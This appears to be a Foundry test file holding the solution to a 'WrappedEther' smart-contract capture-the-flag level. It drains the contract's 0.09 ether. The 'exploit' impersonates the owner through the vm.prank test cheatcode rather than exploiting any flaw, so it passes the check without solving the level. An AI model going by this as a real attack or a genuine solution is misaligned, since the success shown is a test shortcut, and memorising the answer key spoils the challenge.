// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        vm.startPrank(owner);
        vm.deal(owner, 0.09 ether);
        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(owner);
        vm.stopPrank();
    }

    function testExploitLevel() public {
        vm.prank(owner);
        instance.approve(address(this), type(uint256).max);
        instance.transferFrom(owner, address(this), 0.09 ether);
        instance.withdrawAll();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
